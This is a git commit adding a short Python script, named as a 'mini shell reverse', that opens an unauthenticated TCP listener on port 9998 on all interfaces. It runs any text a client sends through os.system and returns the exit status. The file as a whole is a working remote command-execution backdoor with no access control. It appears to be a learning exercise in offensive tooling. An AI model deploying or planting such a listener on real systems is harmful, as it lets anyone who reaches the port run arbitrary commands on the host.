0ce1000fe941b40a804f14d9dec81e1cf775dc5d
ChrystianRubio <chrys.melo@outlook.com>
2023-04-18 13:15:31 -0400

    mini shell reverse

---
+++ tcpServerShell.py
@@ -0,0 +1,36 @@
+import socket
+import threading
+import os
+
+IP = '0.0.0.0'
+PORT = 9998
+
+
+def main():
+	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	server.bind((IP, PORT))
+	server.listen(5)
+	print(f'[*] Listening on {IP}: {PORT}')
+
+	def handle_client(client_socket):
+		with client_socket as sock:
+			request = sock.recv(1024)
+			print(f'[*] Received: {request.decode("utf-8")}')
+			#sock.send(b'ACK')
+			
+			#exec in the system
+			response_system = str(os.system(request.decode("utf-8")))
+#			response_system = str(f"code return: {os.system('echo $?')}")
+			sock.send(response_system.encode())
+
+
+	while True:
+		client, address = server.accept()
+		print(f'[*] Accepted connection from {address[0]}:{address[1]}')
+
+		client_handler = threading.Thread(target=handle_client, args=(client, ))
+		client_handler.start()
+
+if __name__ == '__main__':
+	main()
